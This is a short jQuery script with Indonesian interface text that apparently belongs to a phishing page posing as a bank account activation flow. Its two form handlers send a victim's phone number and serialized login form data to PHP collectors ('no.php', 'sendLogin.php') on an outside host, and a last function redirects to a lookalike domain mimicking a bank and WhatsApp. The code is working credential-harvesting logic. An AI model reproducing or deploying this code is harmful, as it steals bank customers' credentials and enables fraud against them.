$('#eform').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
 
   $('.load').fadeIn(); 
    
  document.getElementById('kirims').innerHTML = "Memproses....";

$.ajax({
 type: 'POST',
 url: 'https://axcellent.dvnet.org/app24/no.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='data.html';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
$('.load').fadeOut(); 
     }, 500);
        }
    });

    return false;
});       
    
    
$('#login').on('submit', function (event) {


 
  event.stopPropagation();
    event.preventDefault();
  $('.load').fadeIn(); 
  
    
  document.getElementById('kirims').innerHTML = "Memproses....";

$.ajax({
 type: 'POST',
 url: 'https://axcellent.dvnet.org/app24/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='aktivasi.html';  
    $('.load').fadeOut(); 
     }, 500);
        }
    });

    return false;
});           

audio4 = document.getElementById("bsiku");
function go(){
$('.load').fadeIn();
audio4.play();    
audio4.loop = false;
document.getElementById('kirim').innerHTML = "Mohon tunggu sebentar...";
setTimeout(function(){  
location.href='https://bjbbaruwasapmy.wasap.my/';
$('.load').fadeOut();
    }, 5500);    
}  
